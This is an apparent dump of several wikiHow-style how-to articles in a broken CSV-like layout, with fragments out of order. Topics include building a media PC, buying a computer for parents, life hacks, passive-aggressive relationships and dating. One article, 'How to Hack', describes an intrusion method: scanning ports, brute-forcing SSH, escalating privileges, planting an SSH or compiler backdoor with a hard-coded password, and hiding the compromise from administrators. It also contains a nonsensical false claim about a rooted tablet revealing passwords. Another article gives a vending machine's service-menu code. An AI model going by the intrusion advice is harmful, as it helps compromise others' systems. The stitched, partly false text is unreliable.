Shop around.,
Choose a processor.,
Choose a motherboard.,
Purchase RAM.,
Choose a video card (optional).,
Decide on the storage amount.,
Purchase an optical drive.,
Pick out a case.,
Choose the correct power supply (PSU).,
Pick up some peripherals.",How to Build a Media PC1," Prices vary a great deal between outlets. Find a retailer that has a good return policy, as computer components have a chance of being DOA (dead on arrival). You’ll want to buy from a company that makes exchanging parts as hassle-free as possible.;
, For a media PC, you won’t need the latest and most expensive processor that you might need in a gaming PC. You will need one that can handle HD playback of movies. Look for a mid-range quad-core processor.


Try to use a low-energy processor, as this will lower your heating requirements, which will in turn reduce the overall noise of your machine.

, Your motherboard choices will largely be dictated by your processor choice. USB 3.0, Ethernet, and Wi-Fi are all essential components of a good motherboard. You’ll want a motherboard that has HDMI and DVI connectors, depending on the TV that you are connecting it to. HDMI transmits both audio and visual signals, so if you aren’t connecting via HDMI you’ll need audio connectors such as SPDIF.


If you are planning on getting a solid state drive (more on that below), make sure that the motherboard has SATA III support.
Motherboard size is determined by the case that you choose, and vice versa.

, RAM is one of the simpler purchases when building an HTPC. Compare reviews to make sure you are buying from a trusted company, as RAM has a fairly high fail rate. The pin numbers for the sticks of RAM must match the pin number for the motherboard. Make sure that the DDR Type and Frequency are supported by your motherboard.


Since RAM is inexpensive, get the highest frequency RAM that your motherboard can support. You will want 4GB, either as 4 sticks of 1GB or 2 sticks of 2GB.

, You will only need a video card if you are planning on playing games on your HTPC as well. Most motherboards will be able to handle video playback and streaming just fine. If you are adding a video card, you will also need to make sure that your power supply and case (below) will support it.

, Your storage needs will vary depending on the way you intend to use your HTPC. If you are streaming video from the internet and watching movies on DVD and Blu-ray, you will not need much in the way of storage. If you are archiving video and music files, you could potentially need several terabytes of storage. Either way, you will need at least a 60GB hard drive to install your operating system (OS) and media programs on.


Consider a solid state drive for your OS. They are quiet and low power, and quite a bit faster than a traditional hard drive. This will lead to quicker startup times. They are significantly more expensive, however, and may not be suitable for large amounts of storage.

, Any modern HTPC should have a Blu-ray drive installed. This will get you the best picture quality when watching HD movies. Most Blu-ray drives have a 12x read speed. Make sure to purchase from a trusted manufacturer, as optical drives have a high fail rate. Blu-ray drives also read DVDs and CDs.

, Look for HTPC cases. These are computer cases that lay flat, and are around the same size as a stereo receiver. You want to strike a balance between good cooling and quiet fans. You also need to make sure the case is big enough to house your components, but not so big that it has lots of unused space.


When buying a motherboard and case, make sure that they are compatible sizes. Make sure that the case had adequate fans; if it doesn’t add one or two 120mm fans, which are usually the quietest.

, Your wattage needs will vary depending on your components, but if you don’t have a video card, and you’re running a solid state hard drive, you will likely not need more than 300 watts. Look for a PSU that is modular, meaning that you can attach cables for just the parts you need. This will cut down on the space requirements, and the low wattage will mean less noise.

, Having a wireless mouse and keyboard will be very helpful for navigating your computer. There are also several remote options available with either Bluetooth or IR connectivity. You will need video and audio cables to connect your HTPC to your TV and sound system.

Put some batteries in the robot to see if it works.,
Take the head off the robot.,
Disconnect the cable from the motherboard that connects the head to the body.,
Solder the wires that will go out to the Arduino.,
Unscrew the upper body and pull it apart.
,
Wire everything together using this schematic.,
Solder the leads and attach them to the Arduino board.,
Put the robot back together.

,
Upload the code.",How to Hack a Rumble Robot," Typically, they take four AA batteries.

On the back are some switches. There is ""off/on"" and also ""A/B"" to determine which team the robot is on. Push the ""on"" switch. If the bot is working, it should say its name. Put the cover and the batteries off to the side for now.




;
, On the ""neck"" of the robot (between the head and body) there is a little screw that can be taken off with a small phillips head screwdriver. Put the screw aside. There is a small lip in the front of the head that is a little tricky, but should come loose after a little light twisting and turning.
, Using a small screwdriver, pry back the tabs keeping the board down, and pop the board out. You should now have just the naked board.

You should see the black micro processor that makes the bot move backward and forward. This is what we'll be hacking and wiring into.





These are the pin outs on the board where you'll need to connect new wires. The main pins we're concerned with are the four that operate the drive motors. They are connected to the ""H-Bridge"" that will allow us to trigger the motors to rotate forward or reverse by applying a positive voltage to one of two wires for each motor. There is one for forward and one for reverse on each motor. They are connected as follows:





Pin 1.0 Left motor FORWARD
Pin 1.1 Left motor REVERSE
Pin 1.2 Right motor FORWARD
Pin 1.3 Right motor REVERSE



, In this photo we see the ground wire which is connected to the pin labeled in the photo on the white connector and the other four wires soldered in place.

,, The video demonstrates how everything is put together. Make your wires at least 5"" in length to make it easier to mount everything up.

The schematic shown in this article assumes that there will be one sensor on the front of the bot. The video below shows how you can make both the arms sense obstacles, but this will require an extra bump switch (connected to Pin 3 and the ground wire) as described in the video section. The code will also need to be changed accordingly.





If you mount everything on top of the chassis where the head used to be and mount the bump switch on the front, use a micro switch and glue on some pieces of wire from a paper clip as whiskers. The whiskers on the switch should extend left and right the same width as the robot. Add one more whisker pointing down close to the floor. These will help the bot avoid anything that might not return an echo from the PING sensor. Make sure the PING sensor points towards the front and is at 90 degrees to the floor. The LED connected to pin 13 blinks each time the PING scans and it can mounted anywhere you like. The power switch is optional and simply goes in line on the positive battery lead.





When connecting the motherboard to the microcontroller, you may need to make a notch so that the wires don't get pinched when you put the robot back together.





The battery can be held in place by a small piece of velcro or some EPS foam. Solder the negative lead of the 9-volt battery to the auxiliary battery input. Be sure to place the jumper onto ""extension power"" not ""USB.""





If you want to be able to use the ""on/off"" switch, connect the white wire to the back of the switch. The power should go to the switch, run back into the white wire, and feed the Arduino power when you turn it on.





The PING sensor can go anywhere on the front of the robot. In this example, the sensor has been glued into the faceplate of the robot. Cut out the ""eye-holes"" on the faceplate and then just add glue around the ""eyes"" of the sensor to keep the plate sturdy. The ribbon cable that connected to the head of the robot has been stripped down to three leads (instead of the original four) and soldered to the three leads on the PING sensor. The other end connects to the Arduino as specified in the schematic.






, Refer to the schematic once again for help.
,, Connect the USB cable to your computer and plug the other end into the Arduino's USB port. Set your robot on a riser so the wheels don't touch anything and power up the Arduino. Copy the code and paste it into a new window in the Arduino software. Save the sketch as ""rumblebot ping bump"" and upload it. After it's uploaded, power down the Arduino, disconnect the USB cable, set the bot on the floor and power up the Arduino. It should start to drive forward with the LED blinking. As it gets within 30 centimeter (11.8 in) of an object, it should turn away and keep driving forward. If it hits an object and triggers the bump switch, it should stop, reverse its direction and turn, then proceed forward."

Exit the menu.",How to Hack a Coke Machine," There should be a label on both sides of the machine, such as ""Ice Cold Coca-Cola."" If the machine's LED display simply displays the price, the steps below may not work the same as they would on one that doesn't display the costs .;
, The default access code is 4, 3, 2, 1 but the buttons aren't numbered. They will either say nothing or have pictures of Coke, Diet Coke, Sprite, and other Coca-Cola products on them.


If the buttons are in rows, they should be numbered 1 through 4 from left to right.
If the buttons are in a column, button 1 should be the top one.

, Again, this will vary slightly depending on the machine. Experiment with different buttons to see various information.


On machines with two panels of six buttons on each side, press 1 to see the total lifetime sales, 2 for the total lifetime items sold, 3 for a breakdown of items sold of each selection, 4 for a breakdown of cash generated for each selection, and 5 for the machine' internal temperature.

, On some machines, the 6 button will close the menu; on others, pressing the select or coin-return button works. If you’re not sure which button to press, leave the machine alone; after a while without input, all machines should return to the normal menu.

Learn a programming language.,
Know your target.,
Use a *nix terminal for commands.,
Secure your machine first.,
Test the target.,
Determine the operating system (OS).,
Find a path or open port in the system.,
Crack the password or authentication process.,
Get super-user privileges.,
Use various tricks.,
Create a backdoor.,
Cover your tracks.",How to Hack," You shouldn't limit yourself to any particular language, but there are a few guidelines.


C is the language that Unix was built with. It (along with assembly language) teaches something that's very important in hacking: how memory works.
Python or Ruby are high-level, powerful scripting languages that can be used to automate various tasks.
Perl is a reasonable choice in this field as well, while PHP is worth learning because the majority of web applications use PHP.
Bash scripting is a must. That is how to easily manipulate Unix/Linux systems—writing scripts, which will do most of the job for you.
Assembly language is a must-know. It is the basic language that your processor understands, and there are multiple variations of it. You can't truly exploit a program if you don't know assembly.;
, The process of gathering information about your target is known as enumeration. The more you know in advance, the fewer surprises you'll have.

, Cygwin will help emulate a *nix for Windows users. Nmap in particular uses WinPCap to run on Windows and does not require Cygwin. However, Nmap works poorly on Windows systems due to a lack of raw sockets. You should also consider using Linux or BSD, which are both more flexible. Most Linux distributions come with many useful tools pre-installed.

, Make sure you've fully understood all common techniques to protect yourself. Start with the basics — but make sure you have authorization to attack your target : either attack your own network, ask for written permission, or set up your own laboratory with virtual machines. Attacking a system, no matter its content, is illegal and WILL get you in trouble.

, Can you reach the remote system? While you can use the ping utility (which is included in most operating systems) to see if the target is active, you can not always trust the results — it relies on the ICMP protocol, which can be easily shut off by paranoid system administrators.

, Run a scan of the ports, and try pOf, or nmap to run a port scan. This will show you the ports that are open on the machine, the OS, and can even tell you what type of firewall or router they are using so you can plan a course of action. You can activate OS detection in nmap by using the -O switch.

, Common ports such as FTP (21) and HTTP (80) are often well protected, and possibly only vulnerable to exploits yet to be discovered.


Try other TCP and UDP ports that may have been forgotten, such as Telnet and various UDP ports left open for LAN gaming.
An open port 22 is usually evidence of an SSH (secure shell) service running on the target, which can sometimes be brute forced.

, There are several methods for cracking a password, including brute force. Using brute force on a password is an effort to try every possible password contained within a pre-defined dictionary of brute force software


Users are often discouraged from using weak passwords, so brute force may take a lot of time. However, there have been major improvements in brute-force techniques.
Most hashing algorithms are weak, and you can significantly improve the cracking speed by exploiting these weaknesses (like you can cut the MD5 algorithm in 1/4, which will give huge speed boost).
Newer techniques use the graphics card as another processor — and it's thousands of times faster.
You may try using Rainbow Tables for the fastest password cracking. Notice that password cracking is a good technique only if you already have the hash of password.
Trying every possible password while logging to remote machine is not a good idea, as it's easily detected by intrusion detection systems, pollutes system logs, and may take years to complete.
You can also get a rooted tablet, install a TCP scan, and get a signal upload it to the secure site. Then the IP address will open causing the password to appear on your proxy.
It's often much easier to find another way into a system than cracking the password.

, Try to get root privileges if targeting a *nix machine, or administrator privileges if taking on Windows systems.


Most information that will be of vital interest is protected and you need a certain level of authentication to get it. To see all the files on a computer you need super-user privileges - a user account that is given the same privileges as the ""root"" user in Linux and BSD operating systems.
For routers this is the ""admin"" account by default (unless it has been changed); for Windows, this is the Administrator account.
Gaining access to a connection doesn't mean you can access everything. Only a super-user, the administrator account, or the root account can do this.

, Often, to gain super-user status you have to use tactics such as creating a buffer overflow, which causes the memory to dump and that allows you to inject a code or perform a task at a higher level than you're normally authorized.


In Unix-like systems this will happen if the bugged software has setuid bit set, so the program will be executed as a different user (super-user for example).
Only by writing or finding an insecure program that you can execute on their machine will allow you to do this.

, Once you have gained full control over a machine, it's a good idea to make sure you can come back again. This can be done by backdooring an important system service, such as the SSH server. However, your backdoor may be removed during the next system upgrade. A really experienced hacker would backdoor the compiler itself, so every compiled software would be a potential way to come back.

, Don't let the administrator know that the system is compromised. Don't change the website (if any), and don't create more files than you really need. Do not create any additional users. Act as quickly as possible. If you patched a server like SSHD, make sure it has your secret password hard-coded. If someone tries to login with this password, the server should let them in, but shouldn't contain any crucial information.

Think about what your parents will use the computer for.,
Figure out how comfortable your parents are with computers.,
Think about ergonomics, especially for the elderly.,
Ask your parents where they will use the computer.",How to Buy a Computer for Your Parents1," Before you buy a computer for your parents, you should carefully consider their computing needs. Ask your parents what their specific needs are prior to shopping for a computer. Some users may run specialized software that can require additional memory and processing power. Most users need a computer for more general operations that include email, browsing the Internet, editing and storing photographs, listening to music, watching DVDs or streaming video, and playing games online.Try saying, “Dad, what will you want to use the computer for? Will you want it for typing, or do you need it to search for things online?”;
, Talk to your parents about how comfortable they are using a computer. Different adults have different comfort levels and experience with computers. This should be considered when choosing a computer. For example, parents who are new to computers might do better with a touchscreen model or a system that has intuitive navigation and applications. Experienced users, on the other hand, can handle more complicated setups and operating systems.Try asking, “Mom, what do you usually use the computer for?”
If asking doesn’t work, you can try observing them using a computer, either at home or in a store, to gauge their comfort level.

, If your parents have physical needs, such as needing to be in a comfortable chair while computing, then a standard desktop could be a good choice for them. Buying a desktop for your parents means you can help them set up a comfortable space that can be modified to meet any physical needs they might have. Comfort-related benefits of a desktop to consider include:Larger screen size
Easy use of ergonomic mouse and keyboard
Comfortable setup in a designated space

, Where your parents plan on accessing their computer is an important factor to consider when purchasing a computer. For example, if your mother wants to be able to take her computer to a local coffee shop several days a week, then a desktop wouldn’t be a good choice. If your father plans on accessing the Internet in multiple rooms around the house, then a laptop with wireless capabilities would be a good fit for him."

If you have an antistatic wristband, use it and attach the lead to the bare metal of your case. Don’t do the assembling on carpet, and if you are standing, remove your socks. Don’t wear synthetic clothes while assembling the PC.

, In order to install the motherboard, you will need to prepare the case. Open the empty case with the back or bottom lying on your work surface. Install the motherboard I/O plate into the case. This plate is different for every motherboard, and has holes for each of the connectors.


Install the motherboard risers. There will be multiple screw holes in your case for the risers. Screw them in to the holes that correspond with your specific motherboard. The risers are installed with your fingers, and have a hole in the top that another screw can be inserted into.
Place the motherboard on the risers. Gently push the motherboard into the I/O plate as you install the screws. Start with the screws closest to the I/O plate and move out from there.
Install the processor. Carefully remove the processor from the package, and line up the triangle on the processor socket to the triangle that is printed on the processor.
Be sure not to handle the pins, and make sure that you do not force the processor into the socket.
Once the processor has been inserted, secure it by locking the socket lever.
Install the CPU cooler. If you purchased your processor retail, then chances are the processor came with a cooling fan with thermal grease already applied. If not, you will need to put a thin layer of thermal grease on the processor before installing the CPU fan.

, Line up the notches in the RAM with the notches in their sockets. Press down firmly in the center until you hear it click. Both of the clips on either end should be securely locked into place.

, Depending on the case, you may need to install mounts on the drives before inserting them. Make sure that your optical drive is flush with the front of your case. Some cases may require you to attach a cover to the front of the optical drive tray.

, If you are adding a video card to your HTPC, install it now. Look for the PCI-E slot on the motherboard. It will be shorter than the other slots and a different color. Press the card into the slot firmly, and the clip will click into place. The back plate should line up with the opening in the back of the case.

, Most fans will have indicators on the top showing which direction the air will flow. You will want one fan pulling in air and an opposite fan pushing it out. This will make for optimum cooling as fresh, cool air is passed over your components.

, Before connecting your components, attach the case features to your motherboard. This means attaching the leads for your power switch, the power LEDs, any USB and audio ports on the case, fans, etc. Most motherboards have these connections labeled, though you may need to consult your motherboard’s manual for specific locations.

, Insert your power supply into its bay, and secure it with screws. Attach the appropriate power connectors to their devices. Make sure that all of your installed components are properly connected, including your motherboard. If you are using a modular PSU, you only need to attach the cables you need. Otherwise, tuck the excess cables away.

, Connect your hard drive and optical drive to your motherboard using the SATA connectors. Tuck away excess lengths of cable and make sure nothing is obstructing any of the fans.

, A well-designed case helps to maximize airflow. Make sure you case is properly sealed, and avoid running your computer with the case open.

, Using an HDMI cable, or a DVI and SPDIF connector, attach your HTPC to your TV. Make sure that your TV is set to the appropriate input when using the HTPC.

Install a media player.",How to Build a Media PC3," Once your PC is finished being assembled, it’s time to start installing the software you need to turn it into a true media center. First, you will need and operating system. Windows is the most common choice, with either 7 or 8 being good options depending on user preference. If you have more than 4GB of RAM, install a 64-bit version of Windows in order to utilize the extra memory. If you’re more technically inclined, Linux is a free alternative that can perform all the functions of an HTPC. It is significantly less user friendly than Windows.

, Using either the Ethernet port or Wi-Fi, connect your HTPC to the network so that you can start streaming web content such as Netflix and Hulu.

, Windows comes installed with a media player, but it can’t play some of the major formats for downloaded video. If you are using your HTPC to watch downloaded media files, you will need a good media player to view some of the more complex file types. There are several good free media players available online.

Consider retaining familiarity.,
Ask your parents if they are interested in a laptop.,
Think about trying a tablet.,
Don’t disregard a desktop computer.",How to Buy a Computer for Your Parents2," When you purchase a computer for your parents, it might not be the first time they have ever used one. If this is the case, you should consider purchasing a computer with hardware, an operating system, and features similar to the computer they are used to working on. Retaining familiarity means they will be more comfortable with the new computer and there will be less of a learning curve.For example, if your parents are used to using Windows on a desktop computer, it might be a good idea to purchase a desktop that operates using Windows.

, Laptops can be a good choice for computer users who want portability in a computer model. Their screen sizes generally range from around 11 inches to 15 inches, which is much smaller than the screen size of most desktops. They also offer less choice in internal components, and can be more difficult to upgrade and repair. For most users, however, these drawbacks are made up in the laptop’s size, portability, and accessibility., A tablet with a keyboard can be a great computer choice for your parents. An iPad, for example, takes minimal time to boot or load apps, is nearly impervious to viruses, and has an operating system that is easy to learn and use. A tablet travels well and will give your parents flexibility in their daily use. It is also an extremely budget-friendly option., If portability isn’t a priority for your parents, you should consider a desktop computer. A desktop setup can be more comfortable and will allow you multiple options including more memory and processing power for your money. Monitors on desktops are also larger, usually starting at 17 inches, which can be an important factor to consider if your parents struggle with eyesight issues."

Involve your parents in the process.,
Take your parents to a brick and mortar store.,
Shop online with your parents.,
Purchase the software and accessories your parents need.,
Buy within your budget.,
Compare prices at multiple stores.",How to Buy a Computer for Your Parents3," If you are buying a computer for your parents, or making a computer purchase on their behalf, it is important that you ask your parents to get involved. Involving your parents in as many parts of the purchasing process as possible will ensure they end up with a computer that meets their needs and that they are excited about using.


You can involve your parents by asking them about their needs, taking them shopping, and helping them set a budget.

, If it is possible, you should visit a store with your parents to test out different models. This in-person experience will allow them to gain hands-on experience with different types and models of computers that fit within the budget. You may find out that a parent who was hesitant about getting a tablet with a wireless keyboard falls in love with this option when given the opportunity to try it out.

, If you live in another town, or can’t find time in your schedule to take your parents to shop for a computer in person, the next best thing is a virtual shopping trip. Call your parents, or have them come over to your house, and explore computers in online stores. This will involve them in the process and hopefully help them end up with a model they are excited about using.

, Not every computer will come with all the software or accessories your parents will need or want to use. For example, if your parents need Microsoft Office, you will need to purchase, download, and install this software.

, When purchasing a computer for your parents, or making a purchase on their behalf, it is important that you stick as closely to your budget as possible. For example, if your parents need a simple laptop to check email and edit photographs, then you should be able to stick to a budget of around $500 or less.

, Once you’ve decided on a model, make sure you shop around before finalizing your purchase. The prices of computers can vary widely depending on the store and whether or not a retailer is having a sale or promotion. Some retailers will even match the price of their competitors, so be sure to ask before you buy.

Stop using hacks that require small objects.,
Avoid collecting clutter.,
Fend off organizational life hacks.,
Use stuff for what it is supposed to be used for.,
Restrict yourself to buying only things you don't already have.,
Avoid being a perfectionist.,
Use your common sense.,
Restrict yourself from wasting your time.",How to Avoid Least Effective Life Hacks," For example, paperclips do not help organize cables and do not help people find the end of a roll of tape. Also, don't use the ends of pants hangers as clips around the house. They will just get scattered, lost, broken, misplaced and are impossible to keep track of.;
, You may have seen people collecting juice bottles to use when they lose their dustpans, as well as can tabs to use as fishing hooks and to hang clothes with. Don't do this. That way, you can avoid becoming a hoarder and letting useless items inhibit your day-to-day routine.

, Some people use bread clips to hang off cords and cables so that they can be labelled. Hacks like these are tedious and tend to waste more time than they save. It is best to avoid spending massive amounts of time on organizing your possessions. Instead, focus on keeping your possessions to a minimum and strive to keep those items that you often use readily accessible.

, A lot of people use the life hack where you use a ketchup bottle to pour out pancake mess. Ironically, by the time you get the pancake mix in and when you clean it out, you are left with more mess and hassle. Some people even use their shoe organizers to put cleaning chemicals in, and then they wonder where to put their shoes.

, Having to go out and buy something for a specific purpose is not a life hack. Heaps of life hacks involve using a shoe organizer to organize anything such as cleaning chemicals, but this hack is only useful to people who have a shoe organizer they are not using lying around their house. Otherwise you will may as well buy something which has already been designed for the purpose.

, Taking extra time to do something perfectly is a waste of your life and annoying to other people. Life hackers have come up with easy ways to fold your clothes, but what is even quicker and easier is to shove your clothes in the drawer and not be a folding freak, for example.

, Decide whether the hack is too good to be true, more effort to perform then doing something the conventional way, or just not worth your while. For example, just by looking at a recipe for homemade gin, you can see it costs more, takes forever and has lots of ingredients you wouldn't normally have, so don't, just buy some good old mother's ruin from the liquor store.

, Spare yourself the disappoint of finding out that balancing a spoon on a pot of boiling water, making a speaker out of a toilet roll, using a toaster to make a sandwich and adding salt to decrease the boiling point of water doesn't work.

Decide on your boundaries, your non-negotiable crossing points.,
Keep your own inner calm.,
Stay focused on your own behavior and on maintaining your integrity.",How to Deal with a Passive Aggressive Relationship," The fact that you're wondering is a definite start. However, it's important to be clear on what passive-aggressive behavior is and whether it's an issue in your relationship. (A relationship is considered to be quite broad, including romantic, workplace, friendship, fellow hobbyists, whomever you relate to!) The following steps will help you to tease out this possibility, although you may also like to get some supporting opinions from persons you trust.;
, Some typical passive-aggressive approaches to relating with others include:


An unwillingness to articulate feelings, especially negative feelings. Instead, they are kept bottled up inside, only to either explode at some really inconvenient point much later on, or be the subject of covert muttering, gossip or irritability (in an attempt to have you overhear without directly speaking to you).
Agrees to do as you suggest/ask, or even offers to complete tasks, then never does them (this is known as ""temporary compliance""). He/she may use procrastination or delay as an art form, an art to frustrate others! Or, he/she does the task to his/her own timetable, or does it in a half-hearted and incomplete way (in the hope you'll never ask again).
Sulks, goes quiet, pouts, gets moody (says things such as ""Fine. Whatever.""). The sullenness can last often for hours or more, all because he/she failed to get his/her own way or failed to articulate clearly enough what was wanted and then blames the other.
Gives sarcastic responses instead of treating issues seriously or listening authentically. This can include subtle ways of putting down your efforts or wants.
Denies being angry, mad or blue. And yet, there is quite evidently something seething away there. Most of the time nobody has the energy to tease it out, so in there it remains, festering. Another possibility pushing you to the brink of looking like the one who is irritable or angry, allowing him/her to shift the blame.
Quits. ""That's it, I've had it, I am out of here. You never appreciated me anyway."" And most probably storms off into the bargain, leaving everyone scratching their heads as to where this all came from (it often occurs after the slightest of provocations––remember that simmering pot of unexpressed needs and wants).

, Perhaps what you've read has already helped you to decide. You might also like to ask a trusted friend or your therapist for advice, to act as a sounding board. Consider some of the following possible indicators that you are in a passive-aggressive relationship:


You feel that your time and desires are not respected. For example: You call out ""dinner's ready"". Your spouse says ""In a moment"". That moment stretches out to half an hour as he/she ""just finishes"" some game/writing/TV, whatever. You have gone to the trouble of making a meal. There should be no delay in turning up to share it without a very good reason. Should you find this happening constantly, it's probably passive-aggressive behavior, and it is very controlling.
You feel that your reasonable requests are being undermined. For example: Your neighbor says that he/she will definitely cut down the overhanging branches that are clogging up your swimming pool. He/she couldn't be sweeter about it, and says ""it's a promise"". Days turn into weeks, he/she smiles and waves from a distance, but still those leaves are clogging up your pool. Eventually you track him/her down and ask about it and he/she says, ""Oh yes, I meant to but my snips were broken. I've had them in for repairs."" A week later, you find half the branches lopped to leave jagged sharp edges at eye-level and the rest still firmly in place. Your ""friendship"" with your neighbor is now questionable.
You feel that you are being purposefully waylaid, preventing you from doing something you'd like to do. For example: You have loved working for X firm for 8 years. But now it's time to move on, so you ask the owner-boss for a reference for an upcoming interview. Your boss says he/she will be sad to lose you but that he/she understands you need to spread your wings. He/she says he'll be happy to give a reference. You don't get the job, and the feedback tells you that your boss said some really negative things about your performance and skills. You're gobsmacked at having discovered that your boss has no intention of letting you go, but just won't tell you to your face.

, This person isn't going to change. However, this person is probably quite nice overall. A lot of passive-aggressive people are ""nice"" because they want to avoid confrontation, seek harmony and would prefer the ""problems"" just didn't exist. Unfortunately, this ""peace and light"" calmness has a cost to others; they just don't want it to be a cost to them. This is where the passive-aggressive resistance comes in, because without articulating what a person wants, it doesn't simply just happen. Few people can, or even want to, read minds. Thus, you may be married to, employed by, attached to, really like, etc. this person, and mostly they seem charming, friendly and agreeable, it's just that dreadful passive-aggressive behavior that irritates you so much (and so it should), causing a communications gap and a failure to pull their own weight when needed.

, A big part of dealing effectively with passive-aggressive behavior will depend on how the behavior causes you to react. If you can spot the behavior and not let it push your helper/enabler/giving in buttons, then you can start to build the courage to cope and stop letting this person get off without penalty. Some things to consider include:



Are you enabling this behavior in any way?: If you are non-confrontational too, perhaps living with the passive-aggressive actions is all just a whole lot easier than having to speak your mind or stand your ground. Add to this a desire to ensure that this person continues to like you ""just the way you are"" and perhaps both of you are dancing around each other without really saying what either of you thinks or wants.

Do you feel controlled?: If you feel as if the passive-aggressive behavior is limiting your choices and ability to say what will happen in your life, then the behavior is most likely impacting you severely. In this case, it's recommended that you get some help from a trusted person or a therapist, in order to help you treat the reasons behind why you capitulate with such ease to controlling methods. Your own assertiveness and strengths will likely need to be given a boost.

Are you the target of comments about your thin skin?: Does this person often claim that you're ""too hyped up"", ""unable to take a joke"", ""wanting things to be too perfect"" or ""getting upset about nothing""? These are all phrases designed to push back the problem onto you, so as to make you look bad. The ""calm"" exterior of the passive-aggressive person is then seen as charming and sensible. The accusations leveled at you can leave you spluttering. If this happens constantly, you are being set up to look like the baddie in the relationship and this nasty pushback needs to be acknowledged and moved away from.

Is the need for approval driving you?: Do you want this person's ""approval"" in some way? If this is a driver in your relationship, it can be a self-enforcing way to keep you tied to the passive-aggressive person's agenda and pace. You don't need anyone's approval. You do need to realize how seeking the approval of such a person leaves you open to being taken advantage of.

, You are going to be in the position of articulating for both of you what only one of you can be bothered to state with clarity. When you state what you want clearly, or call out the passive-aggressive actions, the repercussions from the passive aggressive person may include: withdrawal, overt anger (unusually but this is corner-backing stuff), irritability, tears and stalling. As well as being prepared to cite the passive-aggressive actions you notice when they directly affect you, you will also need to know your own boundaries and what you will no longer tolerate in terms of being held up, messed around and let down.


Know what your own values are and your uncrossable boundaries. When you are clear on these, you will know when you're being used (see below).

, This is your best defense against passive-aggressive behavior. State your preferences and needs factually, repeatedly and without backing down. There are many books and articles available to help you to improve your assertiveness if you're not feeling comfortable about this yet. In the meantime, keep these things in mind:


State the fact(s) and the consequences clearly. Do not explain in great depth and do not use emotional words. Keep it simple, straightforward and clear.
Rinse and repeat if needed. Stick to the same words and message. This makes it clear that you are firm about your expectations.
Inform the passive-aggressive person of how his/her failure to contribute/arrive on time/meet a deadline, etc. impacts you. Stick to ""I"" statements and do not say anything about the other person's character or personality.
Never mention the words ""passive-aggressive"" directly to this person. Always focus on how the behavior makes you feel and impacts you, using the exact descriptive words that fit the situation. Nobody likes being called out openly on being covertly aggressive!

, Consider making alternative arrangements. Instead of relying on the passive-aggressive person, change your approach and never rely on them. Not once, not at all, never again. If they manage to catch up/be on time/do the work, etc., see it as an additional bonus but if not, don't let it ruin your plans, needs and desires. Get on with what you need to get on with. If, in the process of getting on with your life, the passive-aggressive person turns out to be completely unable to handle it, you have an answer to your question as to whether it's worth hanging around or not. On the other hand, you may find he/she will find some healthy respect for you and work in with your stronger self.

, If he/she is into power play, the easiest answer to this is to refuse to play the game. If you don't engage, you cannot be gobbled up by the spiral of self-defeating non-commitment that the passive-aggressive practices as an art form. Ways to avoid playing include:


Ignoring the wiles and attempts to get you to put up with the delays, lack of commitment or shoddy performance.
Going over this person's head. Go to the person who can get done what you need to get done. Don't worry about how the passive-aggressive person will feel; he/she will be feeling mortified that you've worked out the game. Snap!
Reminding yourself that you are just fine. Tell yourself: ""X is game-playing again. This isn't about me, so I won't spend the rest of the evening fuming that he/she failed to cooperate. He/she is just trying to sabotage things again, so I see it for what it is and sidestep it."" Go ahead and do what needs to be done.
Sometimes moving on means that someone else needs to be involved to help finish things. In such a case, don't be afraid to explain how the passive-aggressive person has placed you in this position, so that the problem doesn't reflect poorly on you. Again, stick to facts about being given a firm date but still failing to meet deadlines, etc.; do not call that person names or denigrate their character.

, You can write them down if it helps. Tell the other person when the relevant context arises and say it politely but firmly. For example:


""I appreciate your offer to finish the gardening by Wednesday. I have a birthday party to hold in it on Saturday and I cannot cope with being made to wait when catering and setting up depends on early readiness. Thus, if you have not finished the garden by Wednesday, Jeeves Garden Services will come in on Thursday to fix it all. I will send the bill to you.""
""It's really great that you love playing Xbox all day. But when I've made dinner, I expect you to respect my efforts by coming to the table on time. If you don't, I won't be keeping your meal warm anymore. You can eat it as you find it.""
""While I appreciate that you add value to the documents we get to our clients, I can no longer be placed in an untenable position of telling clients that their product is not ready on time. The deadline is Tuesday next week. If you have not made that deadline, I will be going ahead and printing the document without your input in it.""
""I love that you want to be a part of my life. However, I've come to realize that I end up doing all the planning for our outings and then, we are usually late to everything we go to even though I am well and truly ready on time. From now on, if you don't want to come, just say so, I can handle that openness. If not, I will be leaving at the precise moment needed to get me to the events on time, whether or not you are ready.""

, If you lose it, the passive-aggressive ""wins"" his/her silly little game. This simply opens the opportunity to accuse you of losing the plot, being unreasonable and making a mountain over nothing. This may seem really hard at first but it's really about practice and actually, it can even be about feeling cathartic because the calmer you are, the less comfortable the passive-aggressive person feels. By not toppling into a blithering heap, you maintain the upper hand.


Stay calm. Assert on. (In the tradition of those posters. In fact, make yourself one if it helps.)

, It doesn't matter that the passive-aggressive person has a raft of problems and wants the world to be a kinder, gentler place to them. This kind of thinking is both wishful and immature and won't change things. You are not this person's savior. If this person is to remain a part of your life, make it absolutely clear that it's on your terms too, not only theirs and that relationships are about compromise, collaboration and respect. Respect your own needs and wants, respect what you have striven hard for and do not let the passive-aggressive behavior derail you. With any luck, the passive-aggressive person will lighten up get with you too. If not, it's not your responsibility to mop up and you may need to consider longer-term change.

Watch out for controlling behavior.",How to Date an Alpha Male1," If you are a woman who is attracted to men, you might find that the number of men who have a higher status than you is shrinking.

Women are now outperforming men in employment rates, education, and sometimes in earning potential.Be aware that there will be fewer and fewer men in the dating pool who are more successful than the women they date.

On the one hand, this might mean more competition for the attention of confident, successful men. On the other hand, this might also lead to a redefinition of what ""success"" means in men: traits like kindness, sensitivity, and versatility might be valued more highly in men in the not-too-distant future.;
, Studies show that a person's prestige--or how highly a group values a person--might be just as important to confidence and success as a dominant personality.If you are attracted to confident and successful men, consider how highly a potential partner is valued by his colleagues, superiors, friends, and neighbors. If he is highly valued in his community, this is a good sign that he will be attractive to you.


It is possible for somebody to be prestigious in one area of life and not prestigious in another. For example, perhaps he is excellent at athletic activities but not professionally. Or perhaps he is highly valued as a chef but not as a musician. Consider what areas of life are most important to you when you consider prestige., The myth that the world can be divided into ""alphas"" and ""betas"" has mostly been debunked. Most people are a combination of the two. In many cases, people can act like an ""alpha"" in the arenas where they are very successful and like ""betas"" in the arenas where they have more difficulty. For example, someone might be an ""alpha"" in his job but not in the bedroom. Somebody else might be an ""alpha"" in her political activism but not in her athleticism. Rather than looking for ""alpha"" traits, instead consider thinking about arenas that are important to you and find someone who is confident in that arena. For example, think about whether you want to find:


Someone who is good at sports and athletic activities
Someone who is confident in his creativity and art
Someone who is successful at his job
Someone who is talented at fixing things around the house

